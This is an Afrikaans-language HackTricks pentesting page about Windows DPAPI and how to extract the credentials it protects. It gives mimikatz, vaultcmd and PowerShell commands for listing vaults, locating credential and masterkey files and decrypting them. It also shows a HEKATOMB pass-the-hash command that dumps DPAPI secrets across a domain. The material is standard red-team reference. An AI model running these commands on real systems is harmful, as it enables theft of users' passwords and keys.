# DPAPI - Uithaling van Wagwoorde

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante sibersekerheidgebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie- en sibersekerheidspesialiste in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simmetriese versleuteling van asimmetriese privaatsleutels**, wat gebruik maak van gebruikers- of stelselsekretes as 'n beduidende bron van entropie. Hierdie benadering vereenvoudig versleuteling vir ontwikkelaars deur hulle in staat te stel om data te versleutel met 'n sleutel wat afgelei is van die gebruiker se aanmeldingsgeheime of, vir stelselversleuteling, die stelsel se domeinoutentiseringsgeheime, wat die behoefte vir ontwikkelaars om die beskerming van die versleutelingssleutel self te bestuur, uitskakel.

### Deur DPAPI beskermde data

Onder die persoonlike data wat deur DPAPI beskerm word, is:

* Wagwoorde en outovoltooiingsdata vir Internet Explorer en Google Chrome
* E-pos en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
* Wagwoorde vir gedeelde lêers, bronne, draadlose netwerke, en Windows Vault, insluitend versleutelingssleutels
* Wagwoorde vir afgeleë lessenaarverbindings, .NET Passport, en privaatsleutels vir verskeie versleuteling- en outentiseringsdoeleindes
* Netwerkwagwoorde wat bestuur word deur Credential Manager en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN Messenger, en meer

## Lys van die kluis
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Geloofsbriewe-lêers

Die **gelooofsbriewe-lêers wat beskerm word** kan geleë word in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Kry geloofsbriewe-inligting met behulp van mimikatz `dpapi::cred`, in die respons kan jy interessante inligting soos die versleutelde data en die guidMasterKey vind.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Jy kan die **mimikatz module** `dpapi::cred` gebruik met die toepaslike `/masterkey` om te dekripteer:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Meestersleutels

Die DPAPI-sleutels wat gebruik word om die RSA-sleutels van die gebruiker te enkripteer, word gestoor onder die `%APPDATA%\Microsoft\Protect\{SID}`-gids, waar {SID} die [**Sekuriteitsidentifiseerder**](https://en.wikipedia.org/wiki/Security_Identifier) **van daardie gebruiker** is. **Die DPAPI-sleutel word gestoor in dieselfde lêer as die meestersleutel wat die gebruikers se privaatsleutels beskerm**. Dit is gewoonlik 64 byte se lukrake data. (Let daarop dat hierdie gids beskerm is, sodat jy dit nie kan lys deur `dir` vanaf die cmd te gebruik nie, maar jy kan dit vanaf PS lys).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe 'n klomp Meestersleutels van 'n gebruiker lyk:

![](<../../.gitbook/assets/image (1118).png>)

Gewoonlik is **elke meestersleutel 'n versleutelde simmetriese sleutel wat ander inhoud kan ontsluit**. Daarom is dit interessant om die **versleutelde Meestersleutel te onttrek** om later daardie **ander inhoud** wat daarmee versleutel is, te **ontsleutel**.

### Onttrek meestersleutel & ontsleutel

Kyk na die pos [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) vir 'n voorbeeld van hoe om die meestersleutel te onttrek en dit te ontsleutel.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is 'n C#-port van sommige DPAPI-funksionaliteit van [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projek.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n instrument wat outomaties die onttrekking van alle gebruikers en rekenaars uit die LDAP-gids en die onttrekking van die domeinbeheerder se rugsteunsleutel deur RPC outomatiseer. Die skrip sal dan al die rekenaar se IP-adresse oplos en 'n smbclient op al die rekenaars uitvoer om al die DPAPI-bolle van alle gebruikers te herwin en alles met die domeinrugsteunsleutel te ontsluit.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die uit LDAP onttrekte lys van rekenaars kan jy elke subnetwerk vind selfs al het jy hulle nie geken nie!

"Omdat Domeinadministrateur-regte nie genoeg is nie. Hack hulle almal."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheime beskerm deur DPAPI outomaties dump.

## Verwysings

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is die mees relevante sibersekuriteitsgebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie- en sibersekuriteitsprofessionals in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **sibersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>
